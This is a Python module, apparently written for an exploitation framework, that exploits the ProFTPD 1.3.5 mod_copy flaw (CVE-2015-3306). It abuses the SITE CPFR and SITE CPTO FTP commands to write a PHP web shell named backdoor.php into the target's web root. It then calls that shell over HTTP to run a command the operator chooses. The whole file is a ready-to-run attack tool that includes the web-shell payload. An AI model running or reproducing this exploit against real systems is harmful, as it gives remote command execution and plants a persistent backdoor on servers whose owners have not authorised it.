import socket
import requests
from core.base_module import BaseModule
from rich.console import Console

class ProftpdRce(BaseModule):
    """Exploits ProFTPD 1.3.5 mod_copy RCE (CVE-2015-3306)."""

    def get_options(self):
        """
        Returns the options for this module.
        """
        return {
            'RHOST': ['', 'The target host IP address.'],
            'RPORT': [21, 'The target FTP port.'],
            'WEB_ROOT': ['/var/www/html', 'The absolute path to the web root directory.'],
            'CMD': ['id', 'The command to execute via the backdoor.']
        }

    def run(self, options):
        """
        Executes the ProFTPD RCE exploit.
        """
        rhost = options.get('RHOST')
        rport = int(options.get('RPORT'))
        web_root = options.get('WEB_ROOT')
        cmd = options.get('CMD')
        console = Console()

        if not rhost:
            console.print("[!] RHOST must be set.", style="bold red")
            return

        backdoor_filename = "backdoor.php"
        backdoor_path = f"{web_root}/{backdoor_filename}"
        php_payload = "<?php if(isset($_REQUEST['cmd'])){echo '<pre>';$cmd = ($_REQUEST['cmd']);system($cmd);echo '</pre>';} ?>"

        console.print(f"[*] Targeting ProFTPD at {rhost}:{rport}")

        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((rhost, rport))
                s.settimeout(5)
                resp = s.recv(1024).decode()
                if "220" not in resp:
                    console.print(f"[!] Target is not a standard FTP server: {resp.strip()}", style="bold red")
                    return

                console.print("[*] Sending mod_copy commands to write PHP backdoor...")
                # Use SITE CPFR to select a source file (must exist)
                s.send(b'SITE CPFR /proc/self/cmdline\n')
                s.recv(1024)

                # Use SITE CPTO to write the payload to the destination
                s.send(f'SITE CPTO {php_payload}\n'.encode())
                s.recv(1024)

                # Second command to create the actual file
                s.send(f'SITE CPFR {php_payload}\n'.encode())
                s.recv(1024)
                s.send(f'SITE CPTO {backdoor_path}\n'.encode())
                resp = s.recv(1024).decode()

                if "250" not in resp:
                    console.print("[!] Failed to write backdoor. The server may not be vulnerable.", style="bold red")
                    return

            console.print(f"[bold green][+] Backdoor seemingly planted at {backdoor_path}[/bold green]")
            console.print(f"[*] Attempting to execute command: '{cmd}'")

            # Trigger the backdoor via HTTP
            backdoor_url = f"http://{rhost}/{backdoor_filename}"
            params = {'cmd': cmd}
            response = requests.get(backdoor_url, params=params, timeout=10)

            if response.status_code == 200 and response.text:
                console.print("[bold green][+] Command executed successfully![/bold green]")
                console.print(f"--- Command Output ---\n{response.text.strip()}\n----------------------")
            else:
                console.print(f"[!] Failed to trigger backdoor. Status: {response.status_code}", style="bold red")

        except socket.timeout:
            console.print("[!] FTP connection timed out.", style="bold red")
        except requests.RequestException as e:
            console.print(f"[!] HTTP request to backdoor failed: {e}", style="bold red")
        except Exception as e:
            console.print(f"[!] An unexpected error occurred: {e}", style="bold red")
